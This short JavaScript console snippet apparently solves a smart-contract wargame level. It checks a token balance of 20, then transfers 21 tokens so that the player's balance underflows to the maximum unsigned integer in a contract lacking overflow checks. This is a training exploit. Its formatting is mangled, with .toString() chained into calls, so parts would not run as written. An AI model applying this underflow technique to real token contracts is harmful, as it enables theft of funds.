(await contract.totalSupply())
    .toString()(
        // >> returns 21000000

        await contract.balanceOf(player)
    )
    .toString();
// >> returns 20

// balances is a mapping from addres => uint
// contract is not using Solidity 0.8.0 or SafeMath, so we can underflow our
//  balance in the contract

// send our tokens plus one (20+1) to whatever address
await contract
    .transfer(
        instance,
        21
    )(
        // this will underflow balance[player]

        await contract.balanceOf(player)
    )
    .toString();
// >> returns uint.max

// submit
